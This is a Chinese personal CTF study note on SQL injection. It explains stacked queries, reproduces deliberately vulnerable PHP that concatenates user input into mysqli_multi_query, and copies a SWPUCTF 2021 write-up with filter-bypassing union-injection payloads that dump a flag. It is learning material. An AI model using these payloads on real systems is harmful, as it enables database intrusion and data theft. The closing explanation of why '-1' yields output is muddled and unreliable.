---
title: sql
date: 2024-10-01 22:30:59
categories: WEB
tags: sql
updated: 2024-10-01 22:30:59
---
后面预计会把这些相同的文章全部集合起来，知识点主要都是做题得来得多做点题，省得什么都不会，难搞，也只有半年就要去考研了，唉ctfer起步太慢

### 三个表
- information_schema.schemata: 该数据表存储了 mysql 数据库中的所有数据库的库名
- information_schema.tables： 该数据表存储了 mysql 数据库中的所有数据表的表名
- information_schema.columns: 该数据表存储了 mysql 数据库中的所有列的列名


### 堆叠注入
先讲讲什么加堆叠注入,堆叠注入就是一条sql语句后面加;，多条语句一起执行，比如
```sql
 select * from users;show databases; 
```
就同时执行以上两条命令，所以我们可以增删改查，只要权限够
,其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行
```php
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity
//mysql connections for stacked query examples.
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
// Check connection
if (mysqli_connect_errno($con1))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
else
{
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");
}



$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    
    
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '<font size = "5" color= "#00FF00">';	
            printf("Your Username is : %s", $row[1]);
            echo "<br>";
            printf("Your Password is : %s", $row[2]);
            echo "<br>";
            echo "</font>";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}
else 
    {
	echo '<font size="5" color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
    }
/* close connection */
mysqli_close($con1);

```
对输入的参数没有进行严格的过滤，攻击者构造恶意的攻击语句造成了SQL注入攻击，存在回显点，可以进行联合注入，并且如果出现错误，会输出报错信息，这里也可以使用显错注入。
还可以看到，这里的SQL语句查询使用的是mysqli_multi_query函数，mysqli_multi_query函数可以执行多条SQL语句。

别人得wp直接拿过来，下次给我启发
[SWPUCTF 2021 新生赛]sql
1. 测试
>?wllm=1 -- 正常  
?wllm=1' -- 报错  
?wllm=1'%23 --%23>#-- 正常  
?wllm=1'or 1=1%23 -- 发现有过滤  

2. 测试过滤
>空格，等号  
空格=>/xx/  
等号=?like

3. 测试注入
- 测试长度  
>?wlmm=1'order/\*\*/by/\*\*/3%23 -- 正常  
?wlmm=1'order/\*\*/by/\*\*/4%23 -- 错误
-- 测试长度为3
- 测试回显  
>?wlmm=-1'union/\*\*/select/\*\*/1,2,3%23 # 2,3回显位置
- 查库  
>?wllm=-1'union/\*\*/select/\**/1,2,database()%23 # test_db
- 查表  
>wllm=-1'union/\*\*/select/\*\*/1,2,group_concat(table_name)/\*\*/from/\*\*/information_schema.tables/\*\*/where/\*\*/table_schema/\*\*/like/\*\*/'test_db'%23 -- LTLT_flag,users
- 查列  
>wllm=-1'union/\*\*/select/\*\*/1,2,group_concat(column_name)/\*\*/from/\*\*/information_schema.columns/\*\*/where/\*\*/table_schema/\*\*/like/\*\*/'test_db'%23
-- id,flag,id,username
- 查内容
>?wllm=-1'union/\*\*/select/\*\*/1,2,group_concat(flag)/\*\*/from/\*\*/test_db.LTLT_
flag%23
-- NSSCTF{e99758c1-d31b
- 位数长度不足
使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid
- mid截取，因为回显只能有20个，所以20，一组截取
>?wllm=-1'union/\*\*/select/\*\*/1,2,mid(group_concat(flag),20,20)/\*\*/from/\*\*/tes
t_db.LTLT_flag%23
- 需要读三组
NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}

写一个可能有问题得点,-1为什么有显示，1没有显示  
布尔逻辑：
在某些情况下，数据库会对输入进行布尔评估。比如，如果原始查询是：
>SELECT * FROM users WHERE active = 1;  

如果数据库中没有任何记录的 active 字段为 1，那么这个查询不会返回任何结果。但如果用 -1 替代，可能会导致返回符合条件的结果。
错误处理和信息泄露：

数据库在处理 1 和 -1 时的错误处理方式可能不同。例如，如果 1 导致一个错误或异常，而 -1 不会，这可能会导致不同的行为。在某些系统中，-1 可能被用作特定的标志，表示某种状态或条件。


